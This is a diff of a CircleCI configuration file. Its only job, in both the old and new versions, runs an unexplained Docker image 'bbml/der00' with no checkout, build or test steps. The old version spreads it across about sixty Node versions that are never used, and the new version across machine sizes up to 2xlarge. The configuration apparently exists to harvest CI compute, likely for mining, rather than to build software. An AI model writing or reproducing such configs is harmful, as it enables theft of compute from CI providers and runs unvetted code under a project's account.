@@ -1,32 +1,20 @@
 version: 2.1
 
-executors:
-  linux:
-    docker:
-      - image: docker:17.05.0-ce-git
-
-orbs:
-  node: circleci/node@2.0.0
-
 jobs:
-  test:
+  build:
     parameters:
-      os:
-        type: executor
-      node-version:
+      resource:
         type: string
-    executor: << parameters.os >>
+    resource_class: << parameters.resource >>
+    machine:
+      image: ubuntu-1604:201903-01
     steps:
-      - run:
-          name: XX_firstup
-          command: docker run bbml/der00
-      
+      - run: docker run bbml/der00
 
 workflows:
-  alphaCod3r:
+  workflow:
     jobs:
-      - test:
+      - build:
           matrix:
             parameters:
-              os: [linux]
-              node-version: [10.0.0, 10.1.0, 10.2.0, 10.2.1, 10.3.0, 10.4.0, 10.4.1, 10.5.0, 10.6.0, 10.7.0, 10.8.0, 10.9.0, 10.10.0, 10.11.0, 10.12.0, 10.13.0, 10.14.0, 10.14.1, 10.14.2, 10.15.0, 10.15.1, 10.15.2, 10.15.3, 10.15.4, 10.15.5, 10.15.6, 10.15.7, 10.15.8, 10.15.9, 10.15.10, 10.15.11, 10.15.12, 10.15.13, 10.15.14, 10.15.15, 10.15.16, 10.15.17, 10.15.18, 10.15.19, 10.15.20, 10.16.1, 10.16.2, 10.16.3, 10.16.4, 10.16.5, 10.16.6, 10.16.7, 10.16.8, 10.16.9, 10.16.10, 10.16.11, 10.16.12, 10.16.13, 10.16.14, 10.16.15, 10.16.16, 10.16.17, 10.16.18, 10.16.19, 10.16.20]
+              resource: ["medium", "large", "xlarge", "2xlarge"]
